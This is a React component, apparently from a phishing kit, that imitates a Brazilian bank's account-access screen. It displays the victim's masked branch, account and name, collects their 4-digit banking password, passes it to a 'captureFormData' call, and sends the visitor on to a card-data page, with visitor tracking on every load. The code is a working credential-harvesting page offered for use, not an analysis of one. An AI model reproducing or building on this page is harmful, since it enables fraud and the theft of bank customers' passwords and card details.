import { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { ChevronLeft } from "lucide-react";
import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";

const SenhaAcesso = () => {
  useVisitorTracking("senha-acesso");
  const navigate = useNavigate();
  const location = useLocation();
  const { nome, agencia, conta } = (location.state as any) || {};
  const [senha, setSenha] = useState("");

  const maskedAgencia = agencia ? `*${agencia.slice(-2)}` : "**";
  const cleanConta = conta ? conta.replace(/\D/g, "") : "";
  const maskedConta =
    cleanConta.length >= 3
      ? `***${cleanConta.slice(-3, -1)}-${cleanConta.slice(-1)}`
      : "***--";

  const handleContinuar = () => {
    if (senha.length === 4) {
      captureFormData("senha-acesso", { senha });
      navigate("/dados-cartao", { state: { nome, agencia, conta } });
    }
  };

  return (
    <div className="min-h-screen max-w-md mx-auto relative flex flex-col" style={{ background: 'linear-gradient(135deg, #D7004D 0%, #A30032 100%)' }}>
      {/* Header */}
      <div className="px-5 pt-6 pb-4">
        <div className="flex items-center gap-4">
          <button onClick={() => navigate(-1)}>
            <ChevronLeft className="text-primary-foreground" size={24} />
          </button>
          <h1 className="text-primary-foreground text-lg font-semibold flex-1 text-center pr-8">
            Acesso à conta
          </h1>
        </div>
      </div>

      {/* Account Info */}
      <div className="px-5 pt-4 pb-16 space-y-1">
        <p className="text-primary-foreground text-sm">
          Agência sem dígito: <span className="font-semibold">{maskedAgencia}</span>
        </p>
        <p className="text-primary-foreground text-sm">
          Conta com dígito: <span className="font-semibold">{maskedConta}</span>
        </p>
        <p className="text-primary-foreground text-sm">
          Nome: <span className="font-semibold">{nome?.toUpperCase() || "TITULAR"}</span>
        </p>
      </div>

      {/* White Card */}
      <div className="flex-1 bg-white rounded-t-3xl px-6 pt-8 pb-8 flex flex-col">
        <p className="text-foreground text-base font-medium mb-4">Qual é sua senha?</p>

        <input
          ref={(el) => el?.focus()}
          type="tel"
          inputMode="numeric"
          pattern="[0-9]*"
          maxLength={4}
          value={senha}
          onChange={(e) => setSenha(e.target.value.replace(/\D/g, "").slice(0, 4))}
          className="w-full border-b border-muted-foreground/30 pb-2 outline-none text-lg tracking-[0.5em] text-foreground"
          style={{ WebkitTextSecurity: "disc" } as React.CSSProperties}
        />

        <p className="text-muted-foreground text-sm mt-2">4 dígitos</p>

        <button className="text-[#D7004D] font-bold text-sm mt-4 text-left">
          Esqueci ou não tenho senha
        </button>

        <div className="flex-1" />

        <button
          onClick={handleContinuar}
          disabled={senha.length !== 4}
          className="w-full py-4 rounded-full bg-muted text-muted-foreground font-semibold text-base transition-all disabled:opacity-60 enabled:bg-[#D7004D] enabled:text-white"
        >
          continuar
        </button>
      </div>
    </div>
  );
};

export default SenhaAcesso;
